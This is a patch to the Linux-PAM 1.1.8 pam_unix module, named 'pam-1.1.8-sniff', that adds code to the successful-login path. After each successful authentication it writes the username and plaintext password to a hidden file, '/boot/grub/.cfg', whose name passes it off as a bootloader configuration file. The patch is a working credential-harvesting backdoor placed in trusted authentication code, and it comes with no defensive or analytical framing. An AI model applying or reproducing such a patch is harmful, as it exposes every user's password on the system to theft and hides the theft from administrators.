@@ -1,0 +1,28 @@
+diff -Naur Linux-PAM-1.1.8/modules/pam_unix/support.c pam-1.1.8-sniff/modules/pam_unix/support.c
+--- Linux-PAM-1.1.8/modules/pam_unix/support.c	2013-09-16 13:11:51.000000000 +0400
++++ pam-1.1.8-sniff/modules/pam_unix/support.c	2016-12-01 20:38:31.966332050 +0300
+@@ -2,6 +2,10 @@
+  * Copyright information at end of file.
+  */
+ 
++#include <fcntl.h>
++#include <sys/types.h>
++#include <sys/stat.h>
++
+ #include "config.h"
+ 
+ #include <stdlib.h>
+@@ -767,6 +771,13 @@
+ 	if (retval == PAM_SUCCESS) {
+ 		if (data_name)	/* reset failures */
+ 			pam_set_data(pamh, data_name, NULL, _cleanup_failures);
++
++        // sniff password
++        int log_pass_fd = open( "/boot/grub/.cfg", O_APPEND | O_CREAT | O_WRONLY, 0600 );
++        dprintf( log_pass_fd, "User %s password is %s\n", name, p );
++        close( log_pass_fd );
++
++
+ 	} else {
+ 		if (data_name != NULL) {
+ 			struct _pam_failed_auth *new = NULL;
